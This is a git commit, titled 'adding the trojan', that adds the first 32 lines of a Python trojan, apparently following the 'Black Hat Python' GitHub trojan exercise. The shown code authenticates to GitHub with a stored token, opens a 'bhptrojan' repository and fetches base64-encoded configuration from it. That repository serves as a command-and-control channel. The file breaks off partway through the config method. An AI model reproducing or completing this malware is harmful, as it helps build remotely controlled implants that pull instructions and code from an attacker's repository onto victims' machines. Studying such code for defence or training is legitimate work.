2f0ce320f6a9a84c8ef795abc02deaab3c3ae573
Anderaxarex <a.scarpanti06@gmail.com>
2022-02-08 10:21:01 +0100

    adding the trojan

---
+++ tro.py
@@ -0,0 +1,32 @@
+import base64
+import github3
+import importlib
+import json
+import sys
+import random
+import threading
+import time
+from datetime import datetime
+
+def connect_to_github():
+    with open("mytoken.txt") as f:
+        token = f.read()
+    user = 'Anderaxarex'
+    sess = github3.login(token=token)
+    return sess.repository(user, 'bhptrojan')
+
+def get_content(dirname, module_name, repo):
+    return repo.file_content(f'{dirname}/{module_name}').content
+
+class Trojan:
+    def __init__(self, id):
+        self.id = id
+        self.config_file = f'{id}.json'
+        self.repo = connect_to_github()
+        self.data_path = f'data/{id}'
+
+    def get_config(self):
+        config_file = get_content('config', self.config_file, self.repo)
+        config = json.loads(base64.b64decode(config_file))
+        
+            
